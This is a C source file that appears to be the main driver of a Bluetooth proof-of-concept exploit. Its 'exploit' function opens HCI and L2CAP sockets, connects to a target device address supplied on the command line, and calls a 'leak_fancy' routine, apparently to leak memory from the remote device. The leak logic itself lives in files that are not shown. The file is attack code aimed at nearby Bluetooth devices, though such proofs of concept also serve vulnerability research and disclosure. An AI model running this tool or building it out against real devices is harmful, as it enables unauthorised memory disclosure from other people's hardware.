#include "log.h"
#include "errors.h"
#include "bluetooth.h"
#include "leak.h"

#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

#include <pthread.h>
#include <unistd.h>

err_t exploit(const char *bdaddr_str)
{
    // Create both sockets
    int hci_sock_fd, l2cap_sock_fd;
    uint16_t hci_handle;

    ERR_FWD(bluetooth_hci_create(&hci_sock_fd));
    ERR_FWD(bluetooth_l2cap_create(&l2cap_sock_fd));

    // Connect to the Bluetooth address
    ERR_FWD(bluetooth_l2cap_connect(l2cap_sock_fd, bdaddr_str, &hci_handle))

    uint8_t packet_id = 42;

    uint8_t *data = 0;
    size_t data_size = 0;
    ERR_FWD(leak_fancy(hci_sock_fd, hci_handle, l2cap_sock_fd, &packet_id, &data, &data_size));

    return NULL;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: %s <bdaddr>\n", argv[0]);
        printf("Example: %s 00:11:22:33:44:55\n", argv[0]);

        return -1;
    }

    int ret = 0;

    err_t err = exploit(argv[1]);
    if (err)
    {
        err_print_free(err);
        ret = -1;
    }

    return ret;
}
